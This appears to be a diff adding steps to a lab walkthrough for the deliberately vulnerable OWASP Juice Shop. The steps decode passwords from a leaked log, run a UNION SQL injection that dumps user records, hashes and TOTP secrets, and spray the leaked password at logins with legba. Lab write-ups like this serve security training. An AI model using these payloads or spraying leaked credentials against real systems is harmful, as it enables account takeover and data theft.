@@ -110,6 +110,14 @@ curl -sS http://juiceshop:3000/api/Users/ -H 'Content-Type: application/json' --
 
 ## Leaked Access Logs
 
+* [CyberChef URL Decode](https://gchq.github.io/CyberChef/#recipe=URL_Decode())
+* decode in `parrot-sec`
+    ```bash
+    ./scripts/install_python.sh
+    source ~/.bash_parrot
+    urldecode '<VALUE>'
+    ```
+
 Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to
 
 ```bash
@@ -121,6 +129,30 @@ https://pastebin.com/4U1V1UjU
 
 curl -sS https://pastebin.com/raw/4U1V1UjU | grep pass
 # 161.194.17.103 - - [27/Jan/2019:11:18:35 +0000] "GET /rest/user/change-password?current=0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB&new=sjss22%@%E2%82%AC55jaJasj!.k&repeat=sjss22%@%E2%82%AC55jaJasj!.k8 HTTP/1.1" 401 39 "http://localhost:3000/" "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"
+
+# passwords
+# current: 0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB
+# new: sjss22%@%E2%82%AC55jaJasj!.k
+# repeat: sjss22%@%E2%82%AC55jaJasj!.k8
+
+# passwords decoded
+# current: 0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB
+# new: sjss22%@€55jaJasj!.k
+# repeat: sjss22%@€55jaJasj!.k8
+
+# list of all users
+curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'))+UNION+SELECT+id,username,email,password,role,deluxeToken,totpSecret,isActive,createdAt+FROM+Users;--" | \
+  jq -r '.data[].description' > /hck/share/users.txt
+
+# TODO escaping issue e.g. admin123 is working
+hckctl task legba --inline -- legba http \
+  --target http://box-owasp-juice-shop-<RANDOM>:3000/rest/user/login \
+  --username /hck/share/users.txt \
+  --password '0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB' \
+  --http-method POST \
+  --http-payload 'email={USERNAME}&password={PASSWORD}'
+
+http http://juiceshop:3000/rest/user/login email="J12934@juice-sh.op" password='0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB'
 ```
 
 ## Leaked Unsafe Product
